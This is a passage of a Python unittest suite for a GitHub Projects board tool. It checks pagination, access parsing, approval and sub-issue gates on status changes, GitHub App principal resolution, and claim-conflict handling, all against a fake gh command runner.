            "repositories": {"nodes": [{"nameWithOwner": f"o/r{i}"} for i in range(100)],
                             "pageInfo": {"hasNextPage": True, "endCursor": "CURSOR"}}}}}})
        second = json.dumps({"data": {"repositoryOwner": {"projectV2": {
            "repositories": {"nodes": [{"nameWithOwner": f"o/r{i}"} for i in range(100, 150)],
                             "pageInfo": {"hasNextPage": False, "endCursor": None}}}}}})
        runner = FakeRunner([(["api", "graphql"], _ok(first)),
                             (["api", "graphql"], _ok(second))])
        linked = lb.project_linked_repos("o", 5, runner)
        self.assertEqual(len(linked), 150)
        self.assertIn("after=CURSOR", runner.calls[1])


class ProjectWorkflowsTest(unittest.TestCase):
    """The built-in-workflow enabled-state reader behind the doctor's
    item_closed_workflow check. The API exposes only name + enabled."""

    @staticmethod
    def _payload(workflows):
        nodes = [{"name": n, "enabled": e} for n, e in workflows]
        return json.dumps({"data": {"repositoryOwner": {"projectV2": {
            "workflows": {"nodes": nodes}}}}})

    def test_parses_name_to_enabled_map(self) -> None:
        runner = FakeRunner([(["api", "graphql"], _ok(self._payload(
            [("Item closed", True), ("Item reopened", False)])))])
        self.assertEqual(lb.project_workflows("o", 5, runner),
                         {"Item closed": True, "Item reopened": False})
        # Owner-type-agnostic (User + Organization), like the linked-repos reader.
        query = runner.calls[0][runner.calls[0].index("-f") + 1]
        self.assertIn("repositoryOwner(login: $owner)", query)
        self.assertIn("... on User", query)
        self.assertIn("... on Organization", query)

    def test_none_on_query_failure(self) -> None:
        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="boom")
        runner = FakeRunner([(["api", "graphql"], fail)])
        self.assertIsNone(lb.project_workflows("o", 5, runner))

    def test_paginates_workflows(self) -> None:
        first = json.dumps({"data": {"repositoryOwner": {"projectV2": {
            "workflows": {"nodes": [{"name": "Other", "enabled": True}],
                          "pageInfo": {"hasNextPage": True, "endCursor": "NEXT"}}}}}})
        second = json.dumps({"data": {"repositoryOwner": {"projectV2": {
            "workflows": {"nodes": [{"name": "Item closed", "enabled": True}],
                          "pageInfo": {"hasNextPage": False, "endCursor": None}}}}}})
        runner = FakeRunner([(["api", "graphql"], _ok(first)),
                             (["api", "graphql"], _ok(second))])
        self.assertTrue(lb.project_workflows("o", 5, runner)["Item closed"])
        self.assertIn("after=NEXT", runner.calls[1])


class ProjectAccessTest(unittest.TestCase):
    """The read-only viewerCanUpdate query works for both Project owner types."""

    def test_parses_user_and_organization_shapes(self) -> None:
        for owner_type in ("User", "Organization"):
            with self.subTest(owner_type=owner_type):
                payload = json.dumps({"data": {"repositoryOwner": {
                    "__typename": owner_type,
                    "projectV2": {"id": "PVT_1", "viewerCanUpdate": True},
                }}})
                runner = FakeRunner([(["api", "graphql"], _ok(payload))])
                access = lb.project_access("acme", 5, runner)
                self.assertEqual(access, lb.ProjectAccess(owner_type, "PVT_1", True))

    def test_fails_closed_on_missing_project_or_capability(self) -> None:
        payloads = [
            {"data": {"repositoryOwner": {"__typename": "Organization", "projectV2": None}}},
            {"data": {"repositoryOwner": {"__typename": "Organization",
                                            "projectV2": {"id": "PVT_1"}}}},
            {"data": {"repositoryOwner": {"__typename": "Enterprise",
                                            "projectV2": {"id": "PVT_1",
                                                          "viewerCanUpdate": True}}}},
        ]
        for payload in payloads:
            with self.subTest(payload=payload):
                runner = FakeRunner([(["api", "graphql"], _ok(json.dumps(payload)))])
                self.assertIsNone(lb.project_access("acme", 5, runner))


class CallBudgetTest(unittest.TestCase):
    """Ready-work is 2 gh calls at ANY board size (the bd-ready replacement)."""

    def test_ready_work_is_exactly_two_calls(self) -> None:
        board = lb.BoardConfig(owner="o", number=1, source="committed")
        ctx = lb.RepoContext(root=".", main_root=".", origin_owner="o",
                             origin_repo="r", default_branch="main")
        items = [{"content": {"type": "Issue", "number": i, "repository": "o/r", "title": f"i{i}"}}
                 for i in range(1, 41)]
        blocked_body = {"data": {"repository": {
            f"i{i}": {"blockedBy": {"nodes": [{"state": "OPEN" if i % 2 else "CLOSED"}]}} for i in range(1, 41)}}}
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "o"], _ok(json.dumps({"items": items}))),
            (["api", "graphql"], _ok(json.dumps(blocked_body))),
        ])

        # _require_board reads config from disk; call the legs directly with
        # the injected runner instead.
        got_items = lb._item_list(board, runner, "status:ready_for_work no:assignee")
        numbers = [i["content"]["number"] for i in got_items]
        blocked = lb._batched_blocked_counts(numbers, ctx, runner)
        ready, truncated = lb.merge_ready_legs(got_items, blocked, "o/r")

        self.assertEqual(len(runner.calls), 2)
        self.assertEqual(len(ready), 20)  # odd numbers blocked
        self.assertFalse(truncated)

    def test_failed_ready_work_hard_errors_never_empty(self) -> None:
        board = lb.BoardConfig(owner="o", number=1, source="committed")
        runner = FakeRunner([
            (["project", "item-list"], subprocess.CompletedProcess([], 1, "", "boom")),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb._item_list(board, runner, "status:ready_for_work no:assignee")
        self.assertEqual(caught.exception.code, "ready_work_failed")


def _issue_query_response(*, number=5, assignees=(), stage="planned", blocked=0,
                          item_id="item5", url="u", open_subs=(), parent=None,
                          author_association="OWNER", author_type="User",
                          author_login="someone"):
    """Build an ISSUE_QUERY response with bounded blocker node states.

    `parent` is an int parent issue number; None leaves the issue top-level.
    """
    issue = {
        "number": number, "state": "OPEN", "stateReason": None, "url": url,
        "authorAssociation": author_association,
        "author": {"login": author_login, "__typename": author_type},
        "blockedBy": {"nodes": [{"state": "OPEN"} for _ in range(blocked)]},
        "assignees": {"nodes": [{"login": a} for a in assignees]},
        "closedByPullRequestsReferences": {"nodes": []},
        "subIssues": {"nodes": [{"number": n, "state": "OPEN"} for n in open_subs]},
        "projectItems": {"nodes": [{"id": item_id,
            "project": {"id": "P", "number": 1, "owner": {"login": "acme"}},
            "fieldValueByName": {"name": stage}}]},
    }
    if parent is not None:
        issue["parent"] = {"number": parent}
    return {"data": {"repository": {"issue": issue}}}

class SetStatusGateTest(unittest.TestCase):
    """The in_review seam gate: verb_set_status refuses to advance a parent to
    in_review while it has open sub-issues, unless force=True."""

    def setUp(self) -> None:
        import tempfile
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = self._tmp.name
        (Path(root) / "agentic-engineering.md").write_text(
            "---\ngithub_project_owner: acme\ngithub_project_number: 1\n---\n", encoding="utf-8")
        self.ctx = lb.RepoContext(root=root, main_root=root, origin_owner="acme",
                                  origin_repo="widget", default_branch="main")
        # Restore on teardown: leaking these globally lets one class's patch mask
        # a real cache-I/O dependency in another class, which is exactly how a
        # decompose preflight bug reached CI green locally.
        _real_load, _real_save = lb.load_cache, lb.save_cache
        self.addCleanup(lambda: setattr(lb, "load_cache", _real_load))
        self.addCleanup(lambda: setattr(lb, "save_cache", _real_save))
        lb.load_cache = lambda _ctx: {}
        lb.save_cache = lambda _ctx, _cache: None
        self._field_list = _ok(json.dumps(_schema_fields_payload()))

    def _runner_through_fetch(self, open_subs):
        return FakeRunner([
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(
                _issue_query_response(stage="in_progress", open_subs=open_subs)))),
        ])

    def test_refuses_in_review_with_open_subissues(self) -> None:
        runner = self._runner_through_fetch(open_subs=[7, 8])
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_set_status(5, "in_review", self.ctx, runner)
        self.assertEqual(caught.exception.code, "open_sub_issues")
        # Refused BEFORE any board write (no item-edit call).
        self.assertFalse(any(c[:2] == ["project", "item-edit"] for c in runner.calls))

    def test_force_bypasses_the_gate(self) -> None:
        runner = FakeRunner([
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(
                _issue_query_response(stage="in_progress", open_subs=[7])))),
            (["project", "item-edit", "--id", "item5", "--project-id", "P",
              "--field-id", "F", "--single-select-option-id", "o_in_review"], _ok("{}")),
        ])
        result = lb.verb_set_status(5, "in_review", self.ctx, runner, force=True)
        self.assertEqual(result["stage"], "in_review")

    def test_clean_parent_advances_to_in_review(self) -> None:
        runner = FakeRunner([
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(
                _issue_query_response(stage="in_progress", open_subs=[])))),
            (["project", "item-edit", "--id", "item5", "--project-id", "P",
              "--field-id", "F", "--single-select-option-id", "o_in_review"], _ok("{}")),
        ])
        result = lb.verb_set_status(5, "in_review", self.ctx, runner)
        self.assertEqual(result["stage"], "in_review")

    def test_other_stages_not_gated_by_open_subissues(self) -> None:
        # Advancing to in_progress with open sub-issues is fine — only in_review is gated.
        runner = FakeRunner([
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(
                _issue_query_response(stage="planned", open_subs=[7])))),
            (["project", "item-edit", "--id", "item5", "--project-id", "P",
              "--field-id", "F", "--single-select-option-id", "o_in_progress"], _ok("{}")),
        ])
        result = lb.verb_set_status(5, "in_progress", self.ctx, runner)
        self.assertEqual(result["stage"], "in_progress")


class SetStatusReadyForWorkGateTest(unittest.TestCase):
    """The ready_for_work seam requires a human or an explicit force."""

    def setUp(self) -> None:
        import tempfile
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = self._tmp.name
        (Path(root) / "agentic-engineering.md").write_text(
            "---\ngithub_project_owner: acme\ngithub_project_number: 1\n---\n", encoding="utf-8")
        self.ctx = lb.RepoContext(root=root, main_root=root, origin_owner="acme",
                                  origin_repo="widget", default_branch="main")
        # Restore on teardown: leaking these globally lets one class's patch mask
        # a real cache-I/O dependency in another class, which is exactly how a
        # decompose preflight bug reached CI green locally.
        _real_load, _real_save = lb.load_cache, lb.save_cache
        self.addCleanup(lambda: setattr(lb, "load_cache", _real_load))
        self.addCleanup(lambda: setattr(lb, "save_cache", _real_save))
        lb.load_cache = lambda _ctx: {}
        lb.save_cache = lambda _ctx, _cache: None
        self._field_list = _ok(json.dumps(_schema_fields_payload()))

    def _runner_through_fetch(self):
        return FakeRunner([
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(
                _issue_query_response(stage="planned", open_subs=[])))),
        ])

    def test_refuses_ready_for_work_without_force(self) -> None:
        runner = self._runner_through_fetch()
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_set_status(5, "ready_for_work", self.ctx, runner)
        self.assertEqual(caught.exception.code, "approval_required")
        self.assertFalse(any(c[:2] == ["project", "item-edit"] for c in runner.calls))

    def test_force_bypasses_the_gate(self) -> None:
        runner = FakeRunner([
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(
                _issue_query_response(stage="planned", open_subs=[])))),
            (["project", "item-edit", "--id", "item5", "--project-id", "P",
              "--field-id", "F", "--single-select-option-id", "o_ready_for_work"], _ok("{}")),
        ])
        result = lb.verb_set_status(5, "ready_for_work", self.ctx, runner, force=True)
        self.assertEqual(result["stage"], "ready_for_work")

    def test_error_code_distinct_from_open_sub_issues_gate(self) -> None:
        runner = self._runner_through_fetch()
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_set_status(5, "ready_for_work", self.ctx, runner)
        self.assertNotEqual(caught.exception.code, "open_sub_issues")


def _fail(returncode: int = 1, stderr: str = "") -> "subprocess.CompletedProcess[str]":
    return subprocess.CompletedProcess(args=[], returncode=returncode, stdout="", stderr=stderr)


class GhMeTest(unittest.TestCase):
    """The acting principal resolves through GraphQL `viewer`, not REST `/user`:
    a GitHub App installation token is forbidden on `/user` but resolves here.
    An authenticated-but-forbidden response must never masquerade as a logged-out
    one, or the operator is sent to `gh auth login` for a problem that is not auth."""

    def setUp(self) -> None:
        # _run_gh_retry sleeps before its one 403/429 retry; keep the suite fast.
        real_sleep = lb.time.sleep
        self.addCleanup(lambda: setattr(lb.time, "sleep", real_sleep))
        lb.time.sleep = lambda _seconds: None

    def test_app_installation_token_resolves_with_the_bot_suffix(self) -> None:
        runner = FakeRunner([(["api", "graphql"], _ok("lifewithdata-dev[bot]\n"))])
        self.assertEqual(lb._gh_me(runner), "lifewithdata-dev[bot]")
        # The REST endpoint an App cannot reach is never called.
        self.assertFalse(any(c[:2] == ["api", "user"] for c in runner.calls))
        self.assertIn("viewer", " ".join(runner.calls[0]))

    def test_human_token_login_is_unchanged(self) -> None:
        runner = FakeRunner([(["api", "graphql"], _ok("aagnone3\n"))])
        self.assertEqual(lb._gh_me(runner), "aagnone3")

    def test_genuinely_unauthenticated_still_reports_gh_unauthenticated(self) -> None:
        # Two independent signals, each asserted ALONE so neither can coast on
        # the other: gh's exit code 4 with stderr the text probe cannot match,
        # and the stderr text with a non-4 exit code.
        for proc in (_fail(4, "some future gh phrasing"),
                     _fail(1, "gh: Bad credentials (HTTP 401)")):
            with self.subTest(returncode=proc.returncode):
                runner = FakeRunner([(["api", "graphql"], proc)])
                with self.assertRaises(lb.BoardError) as caught:
                    lb._gh_me(runner)
                self.assertEqual(caught.exception.code, "gh_unauthenticated")
                self.assertIn("gh auth login", caught.exception.fix)

    def test_a_generic_gh_auth_login_hint_is_not_treated_as_an_auth_failure(self) -> None:
        # gh appends that hint to failures that are NOT auth failures. Matching
        # on it would send an App-token operator to re-login for a network error.
        runner = FakeRunner([(["api", "graphql"],
                              _fail(1, "gh: connection refused\nTry: gh auth login"))])
        with self.assertRaises(lb.BoardError) as caught:
            lb._gh_me(runner)
        self.assertEqual(caught.exception.code, "gh_principal_unresolved")

    def test_authenticated_but_forbidden_is_not_reported_as_unauthenticated(self) -> None:
        stderr = "gh: Resource not accessible by integration (HTTP 403)"
        runner = FakeRunner([(["api", "graphql"], _fail(1, stderr)),
                             (["api", "graphql"], _fail(1, stderr))])  # one 403 retry
        with self.assertRaises(lb.BoardError) as caught:
            lb._gh_me(runner)
        self.assertEqual(caught.exception.code, "gh_principal_unresolved")
        self.assertIn("integration", str(caught.exception))

    def test_a_missing_viewer_is_never_accepted_as_a_principal(self) -> None:
        # `gh api --jq` prints a bare `null` (exit 0) for a null field, which
        # would otherwise be carried into `--add-assignee` as a login.
        for stdout in ("\n", "null\n"):
            with self.subTest(stdout=stdout.strip() or "empty"):
                runner = FakeRunner([(["api", "graphql"], _ok(stdout))])
                with self.assertRaises(lb.BoardError) as caught:
                    lb._gh_me(runner)
                self.assertEqual(caught.exception.code, "gh_principal_unresolved")


class _ClaimVerbFixture(unittest.TestCase):
    """Shared temp-repo + cache-seam setup for the verb_claim suites. Holds no
    test cases of its own so subclasses do not re-run each other's."""

    def setUp(self) -> None:
        import tempfile
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = self._tmp.name
        (Path(root) / "agentic-engineering.md").write_text(
            "---\ngithub_project_owner: acme\ngithub_project_number: 1\n---\n",
            encoding="utf-8")
        self.ctx = lb.RepoContext(root=root, main_root=root, origin_owner="acme",
                                  origin_repo="widget", default_branch="main")
        _orig_load, _orig_save = lb.load_cache, lb.save_cache
        # Restore on teardown: leaking these globally lets one class's patch mask
        # a real cache-I/O dependency in another class, which is exactly how a
        # decompose preflight bug reached CI green locally.
        _real_load, _real_save = lb.load_cache, lb.save_cache
        self.addCleanup(lambda: setattr(lb, "load_cache", _real_load))
        self.addCleanup(lambda: setattr(lb, "save_cache", _real_save))
        lb.load_cache = lambda _ctx: {}
        lb.save_cache = lambda _ctx, _cache: None
        self.addCleanup(lambda: (setattr(lb, "load_cache", _orig_load),
                                 setattr(lb, "save_cache", _orig_save)))
        self._field_list = _ok(json.dumps(_schema_fields_payload()))


class ClaimVerbTest(_ClaimVerbFixture):
    """End-to-end verb_claim over a FakeRunner for a HUMAN principal: win,
    two-winner conflict, and blocked-refusal. blockedBy rides the bounded
    node-state shape."""

    def test_win_path_assigns_confirms_and_sets_status(self) -> None:
        runner = FakeRunner([
            (["api", "graphql"], _ok("me\n")),                                    # _gh_me
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), stage="ready_for_work")))),  # initial read
            (["issue", "edit", "5", "--repo", "acme/widget", "--add-assignee", "@me"], _ok("")),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=["me"], stage="ready_for_work")))),  # confirm sole
            # verb_set_status(in_progress): resolve_schema + fetch + item-edit
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=["me"])))),
            (["project", "item-edit", "--id", "item5", "--project-id", "P",
              "--field-id", "F", "--single-select-option-id", "o_in_progress"], _ok("{}")),
        ])
        result = lb.verb_claim(5, self.ctx, runner)
        self.assertEqual((result["claimed"], result["verdict"]), (True, "proceed"))

    def test_two_winner_conflict_self_unassigns(self) -> None:
        runner = FakeRunner([
            (["api", "graphql"], _ok("me\n")),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), stage="ready_for_work")))),
            (["issue", "edit", "5", "--repo", "acme/widget", "--add-assignee", "@me"], _ok("")),
            # confirm read: two winners raced in.
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=["me", "rival"], stage="ready_for_work")))),
            (["issue", "edit", "5", "--repo", "acme/widget", "--remove-assignee", "@me"], _ok("")),
        ])
        result = lb.verb_claim(5, self.ctx, runner)
        self.assertEqual((result["claimed"], result["verdict"]), (False, "claim_conflict"))
        self.assertTrue(any(c[-2:] == ["--remove-assignee", "@me"] for c in runner.calls))

    def test_blocked_refuses_without_assigning(self) -> None:
        runner = FakeRunner([
            (["api", "graphql"], _ok("me\n")),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), blocked=2, stage="ready_for_work")))),
        ])
        result = lb.verb_claim(5, self.ctx, runner)
        self.assertEqual((result["claimed"], result["verdict"]), (False, "blocked"))
        # No assign call was ever made.
        self.assertFalse(any("--add-assignee" in c for c in runner.calls))

    def test_sub_issue_claim_refused_before_any_board_write(self) -> None:
        # An OPEN parented issue is a sub-issue: refuse with a structured error
        # naming the parent, and never touch the board (no assign, no item-edit).
        runner = FakeRunner([
            (["api", "graphql"], _ok("me\n")),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), parent=269)))),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_claim(5, self.ctx, runner)
        self.assertEqual(caught.exception.code, "sub_issue_claim")
        self.assertIn("269", str(caught.exception))
        # No mutating call of any kind was made.
        self.assertFalse(any("--add-assignee" in c for c in runner.calls))
        self.assertFalse(any(c[:2] == ["project", "item-edit"] for c in runner.calls))

    def test_sub_issue_guard_precedes_self_assigned_write(self) -> None:
        # A sub-issue already assigned to ME would otherwise sail past the
        # assignee checks straight into the board write. The parent guard must
        # win first: refuse with sub_issue_claim, mutate nothing.
        runner = FakeRunner([
            (["api", "graphql"], _ok("me\n")),
            (["api", "graphql"],
             _ok(json.dumps(_issue_query_response(assignees=["me"], parent=269)))),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_claim(5, self.ctx, runner)
        self.assertEqual(caught.exception.code, "sub_issue_claim")
        # Neither an assign nor a board write happened.
        self.assertFalse(any("--add-assignee" in c for c in runner.calls))
        self.assertFalse(any(c[:2] == ["project", "item-edit"] for c in runner.calls))

    def test_sub_issue_guard_precedes_claim_conflict(self) -> None:
        # A sub-issue assigned to SOMEONE ELSE would otherwise return a
        # claim_conflict verdict. The parent guard outranks it: this is a
        # sub_issue_claim refusal, not a conflict, and touches nothing.
        runner = FakeRunner([
            (["api", "graphql"], _ok("me\n")),
            (["api", "graphql"],
             _ok(json.dumps(_issue_query_response(assignees=["other"], parent=269)))),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_claim(5, self.ctx, runner)
        self.assertEqual(caught.exception.code, "sub_issue_claim")
        self.assertFalse(any("--add-assignee" in c for c in runner.calls))
        self.assertFalse(any(c[:2] == ["project", "item-edit"] for c in runner.calls))

    def test_refuses_every_stage_below_ready_for_work_without_writing(self) -> None:
        for stage in ("stub", "brainstormed", "planned"):
            with self.subTest(stage=stage):
                runner = FakeRunner([
                    (["api", "graphql"], _ok("me\n")),
                    (["api", "graphql"],
                     _ok(json.dumps(_issue_query_response(assignees=(), stage=stage)))),
                ])
                with self.assertRaises(lb.BoardError) as caught:
                    lb.verb_claim(5, self.ctx, runner)
                self.assertEqual(caught.exception.code, "approval_required")
                # Never touch an unapproved issue: no assignment or board write.
                self.assertFalse(any("--add-assignee" in c for c in runner.calls))
                self.assertFalse(any(c[:2] == ["project", "item-edit"] for c in runner.calls))

    def test_resuming_an_already_started_item_still_claims(self) -> None:
        """The floor must not break resume: in_progress/in_review are above it."""
        for stage in ("in_progress", "in_review"):
            with self.subTest(stage=stage):
                runner = FakeRunner([
                    (["api", "graphql"], _ok("me\n")),
                    (["api", "graphql"],
                     _ok(json.dumps(_issue_query_response(assignees=["me"], stage=stage)))),
                    (["api", "graphql"],
                     _ok(json.dumps(_issue_query_response(assignees=["me"], stage=stage)))),
                    (["project", "field-list", "1", "--owner", "acme"], self._field_list),
                    (["api", "graphql"],
                     _ok(json.dumps(_issue_query_response(assignees=["me"], stage=stage)))),
                    (["project", "item-edit", "--id", "item5", "--project-id", "P",
                      "--field-id", "F", "--single-select-option-id", "o_in_progress"], _ok("{}")),
                ])
                result = lb.verb_claim(5, self.ctx, runner)
                self.assertEqual((result["claimed"], result["verdict"]), (True, "proceed"))


class ClaimVerbAppPrincipalTest(_ClaimVerbFixture):
    """A GitHub App principal cannot be assigned, so --claim skips the assignee
    write and confirms on Status. Every other refusal in the verb must survive:
    those, not the assignment, are why the verb exists.

    Deliberately NOT a subclass of ClaimVerbTest — inheriting those cases would
    re-run them with a hardcoded human `_gh_me` stub, adding runtime and a
    misleading class name in failure output while covering nothing new."""

    BOT = "lifewithdata-dev[bot]\n"

    def test_app_claim_reaches_in_progress_without_assigning(self) -> None:
        runner = FakeRunner([
            (["api", "graphql"], _ok(self.BOT)),                                # _gh_me
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), stage="ready_for_work")))),
            # no assign call — the App is not assignable
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), stage="ready_for_work")))),  # confirm
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=())))),
            (["project", "item-edit", "--id", "item5", "--project-id", "P",
              "--field-id", "F", "--single-select-option-id", "o_in_progress"], _ok("{}")),
        ])
        result = lb.verb_claim(5, self.ctx, runner)
        self.assertEqual((result["claimed"], result["verdict"]), (True, "proceed"))
        self.assertIsNone(result["assignee"])
        self.assertEqual(result["principal"], "lifewithdata-dev[bot]")
        self.assertFalse(any("--add-assignee" in c for c in runner.calls))
        self.assertFalse(any("--remove-assignee" in c for c in runner.calls))

    def test_app_still_yields_to_a_human_assignee(self) -> None:
        runner = FakeRunner([
            (["api", "graphql"], _ok(self.BOT)),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=["human"], stage="ready_for_work")))),
        ])
        result = lb.verb_claim(5, self.ctx, runner)
        self.assertEqual((result["claimed"], result["verdict"]), (False, "claim_conflict"))

    def test_app_still_refuses_below_ready_for_work_a_sub_issue_and_a_blocker(self) -> None:
        cases = [
            ("approval_required", _issue_query_response(assignees=(), stage="planned")),
            ("sub_issue_claim", _issue_query_response(assignees=(), parent=269)),
        ]
        for code, payload in cases:
            with self.subTest(code=code):
                runner = FakeRunner([
                    (["api", "graphql"], _ok(self.BOT)),
                    (["api", "graphql"], _ok(json.dumps(payload))),
                ])
                with self.assertRaises(lb.BoardError) as caught:
                    lb.verb_claim(5, self.ctx, runner)
                self.assertEqual(caught.exception.code, code)
                self.assertFalse(any(c[:2] == ["project", "item-edit"] for c in runner.calls))
        runner = FakeRunner([
            (["api", "graphql"], _ok(self.BOT)),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(
                assignees=(), blocked=2, stage="ready_for_work")))),
        ])
        result = lb.verb_claim(5, self.ctx, runner)
        self.assertEqual((result["claimed"], result["verdict"]), (False, "blocked"))

    def test_app_yields_when_a_human_assigns_between_the_two_reads(self) -> None:
        # Once the assignee write is skipped, this confirming read is the ONLY
        # mutual exclusion left on the App path — the race the ceiling comment
        # concedes is weak. It must still catch a human who landed in between,
        # and must not "yield" by unassigning an assignment it never made.
        runner = FakeRunner([
            (["api", "graphql"], _ok(self.BOT)),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), stage="ready_for_work")))),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=["human"], stage="ready_for_work")))),
        ])
        result = lb.verb_claim(5, self.ctx, runner)
        self.assertEqual((result["claimed"], result["verdict"]), (False, "claim_conflict"))
        self.assertFalse(any("--remove-assignee" in c for c in runner.calls))
        self.assertFalse(any(c[:2] == ["project", "item-edit"] for c in runner.calls))

    def test_app_resumes_an_already_in_progress_unassigned_item(self) -> None:
        # The App's own prior claim leaves no assignee, so resume must not read
        # as "nobody ever claimed this" and must not conflict with itself.
        runner = FakeRunner([
            (["api", "graphql"], _ok(self.BOT)),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), stage="in_progress")))),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), stage="in_progress")))),
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), stage="in_progress")))),
            (["project", "item-edit", "--id", "item5", "--project-id", "P",
              "--field-id", "F", "--single-select-option-id", "o_in_progress"], _ok("{}")),
        ])
        result = lb.verb_claim(5, self.ctx, runner)
        self.assertEqual((result["claimed"], result["verdict"]), (True, "proceed"))

    def test_app_failed_confirming_read_does_not_fabricate_a_conflict(self) -> None:
        # An empty confirming read is indistinguishable from "nobody assigned"
        # for an App, so the read failure itself must surface.
        runner = FakeRunner([
            (["api", "graphql"], _ok(self.BOT)),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), stage="ready_for_work")))),
            (["api", "graphql"], _ok(json.dumps({"data": {"repository": {"issue": None}}}))),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_claim(5, self.ctx, runner)
        self.assertEqual(caught.exception.code, "claim_unverified")


class ReadyWorkVerbTest(unittest.TestCase):
    """--ready-work reads a Status option BY NAME. GitHub's item-list filter does
    not error on an unknown status token — it returns an empty page, exit 0 — so
    an un-migrated board must not read as a legitimately empty queue."""

    def setUp(self) -> None:
        import tempfile
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = self._tmp.name
        (Path(root) / "agentic-engineering.md").write_text(
            "---\ngithub_project_owner: acme\ngithub_project_number: 1\n---\n", encoding="utf-8")
        self.ctx = lb.RepoContext(root=root, main_root=root, origin_owner="acme",
                                  origin_repo="widget", default_branch="main")
        # Restore on teardown: leaking these globally lets one class's patch mask
        # a real cache-I/O dependency in another class, which is exactly how a
        # decompose preflight bug reached CI green locally.
        _real_load, _real_save = lb.load_cache, lb.save_cache
        self.addCleanup(lambda: setattr(lb, "load_cache", _real_load))
        self.addCleanup(lambda: setattr(lb, "save_cache", _real_save))
        lb.load_cache = lambda _ctx: {}
        lb.save_cache = lambda _ctx, _cache: None

    @staticmethod
    def _field_list(stages):
        return _ok(json.dumps(_schema_fields_payload(stages)))

    def test_queries_the_ready_for_work_leg_not_planned(self) -> None:
        """The query string is the approval boundary for the ready queue."""
        items = [{"content": {"type": "Issue", "number": 7, "repository": "acme/widget",
                              "title": "i7"}}]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme", "--format", "json",
              "--limit", "50", "--query", "status:ready_for_work no:assignee"],
             _ok(json.dumps({"items": items}))),
            (["api", "graphql"],
             _ok(json.dumps({"data": {"repository": {"i7": {"blockedBy": {"nodes": []}}}}}))),
        ])
        result = lb.verb_ready_work(self.ctx, runner)
        self.assertEqual([r["number"] for r in result["items"]], [7])
        self.assertEqual(len(runner.calls), 2)

    def test_empty_result_on_an_unmigrated_board_raises_option_missing(self) -> None:
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["project", "field-list", "1", "--owner", "acme"],
             self._field_list([s for s in lb.STAGES if s != "ready_for_work"])),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_ready_work(self.ctx, runner)
        self.assertEqual(caught.exception.code, "option_missing")

    def test_genuinely_empty_queue_on_a_current_board_is_not_an_error(self) -> None:
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["project", "field-list", "1", "--owner", "acme"], self._field_list(lb.STAGES)),
        ])
        self.assertEqual(lb.verb_ready_work(self.ctx, runner)["items"], [])


class SubStatusVerbTest(unittest.TestCase):
    """verb_sub_status drives the mutually-exclusive `status:*` labels board-free.
    Every gh call carries an explicit --repo (in-script gh discipline)."""

    def setUp(self) -> None:
        self.ctx = lb.RepoContext(root=".", main_root=".", origin_owner="acme",
                                  origin_repo="widget", default_branch="main")

    @staticmethod
    def _view(labels, state="OPEN"):
        return _ok(json.dumps({"labels": [{"name": n} for n in labels], "state": state}))

    def test_invalid_status_rejected_before_any_gh_call(self) -> None:
        runner = FakeRunner([])  # any call would raise "unexpected gh call"
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_sub_status(7, "done_ish", self.ctx, runner)
        self.assertEqual(caught.exception.code, "invalid_sub_status")
        self.assertEqual(runner.calls, [])

    def test_in_progress_from_bare_issue_ensures_label_and_adds_it(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "7", "--repo", "acme/widget", "--json", "labels,state"],
             self._view([])),
            (["label", "create", "status:in-progress", "--repo", "acme/widget"],
             _ok("")),
